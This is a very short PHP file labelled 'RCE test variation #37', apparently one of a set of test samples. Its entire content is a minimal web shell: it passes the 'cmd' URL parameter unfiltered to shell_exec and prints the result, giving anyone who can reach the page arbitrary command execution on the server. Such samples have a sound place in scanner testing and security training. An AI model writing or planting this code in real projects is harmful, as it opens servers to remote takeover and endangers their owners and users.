<?php
// RCE test variation #37
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>